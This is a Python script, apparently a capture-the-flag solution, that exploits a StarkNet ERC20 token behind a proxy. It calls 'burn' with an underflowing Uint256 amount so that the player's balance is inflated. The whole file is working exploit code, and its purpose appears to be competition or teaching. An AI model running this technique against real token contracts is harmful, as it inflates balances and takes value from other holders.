import asyncio

from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.networks import TESTNET, MAINNET
from starknet_py.net.client import Client
from starknet_py.net import AccountClient, KeyPair
from starknet_py.contract import Contract
from starknet_py.cairo.felt import MAX_FELT
from starkware.starknet.public.abi import get_storage_var_address
from starkware.starknet.core.os.contract_address.contract_address import calculate_contract_address_from_hash
from starkware.crypto.signature.signature import private_to_stark_key
from eth_hash.auto import keccak

# Local network
from starknet_py.net.models import StarknetChainId

import json


x = '[{"members":[{"name":"low","offset":0,"type":"felt"},{"name":"high","offset":1,"type":"felt"}],"name":"Uint256","size":2,"type":"struct"},{"inputs":[{"name":"owner_account","type":"felt"},{"name":"initial_supply","type":"Uint256"}],"name":"initialize","outputs":[],"type":"function"},{"inputs":[{"name":"account","type":"felt"}],"name":"balanceOf","outputs":[{"name":"balance","type":"Uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"recipient","type":"felt"},{"name":"amount","type":"Uint256"}],"name":"transfer","outputs":[],"type":"function"},{"inputs":[{"name":"recipient","type":"felt"},{"name":"amount","type":"Uint256"}],"name":"mint","outputs":[],"type":"function"},{"inputs":[{"name":"account","type":"felt"},{"name":"amount","type":"Uint256"}],"name":"burn","outputs":[],"type":"function"}]'
impl_abi = json.loads(x)

y = '[{"inputs":[{"name":"auth_account","type":"felt"},{"name":"address","type":"felt"}],"name":"auth_read_storage","outputs":[{"name":"value","type":"felt"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"auth_account","type":"felt"},{"name":"address","type":"felt"},{"name":"value","type":"felt"}],"name":"auth_write_storage","outputs":[],"type":"function"},{"inputs":[{"name":"class_hash","type":"felt"}],"name":"constructor","outputs":[],"type":"constructor"},{"inputs":[{"name":"address","type":"felt"}],"name":"read_state","outputs":[{"name":"value","type":"felt"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"selector","type":"felt"},{"name":"calldata_size","type":"felt"},{"name":"calldata","type":"felt*"}],"name":"_default","outputs":[{"name":"retdata_size","type":"felt"},{"name":"retdata","type":"felt*"}],"type":"function"},{"inputs":[{"name":"selector","type":"felt"},{"name":"calldata_size","type":"felt"},{"name":"calldata","type":"felt*"}],"name":"l1_default_","outputs":[],"type":"l1_handler"}]'
proxy_abi = json.loads(y)


async def main():
    local_network_client = GatewayClient(
        "", chain=StarknetChainId.TESTNET
    )

    player_private_key = ""
    player_public_key = private_to_stark_key(player_private_key)
    player_address = calculate_contract_address_from_hash(
        salt=20,
        class_hash=1803505466663265559571280894381905521939782500874858933595227108099796801620,
        constructor_calldata=[player_public_key],
        deployer_address=0,
    )
    account_client = AccountClient(player_address, local_network_client, key_pair=KeyPair(
        player_private_key, player_public_key))

    proxy_contract_address = ""
    erc20_address = calculate_contract_address_from_hash(
        salt=111111,
        class_hash=await account_client.get_storage_at(proxy_contract_address, get_storage_var_address("implementation"), "latest"),
        constructor_calldata=[],
        deployer_address=0,
    )

    erc20_contract = await Contract.from_address(erc20_address, account_client)

    wrapper_contract = Contract(
        proxy_contract_address,
        erc20_contract.data.abi,
        account_client,
    )

    calls = [
        wrapper_contract.functions["burn"].prepare(2**256 - int(50000e18))
    ]

    res = await account_client.execute(calls=calls, max_fee=int(1e16))
    print(res)

    res = await account_client.wait_for_tx(res.transaction_hash)
    print(res)

    print(await wrapper_contract.functions["balanceOf"].call(account_client.address))


asyncio.run(main())
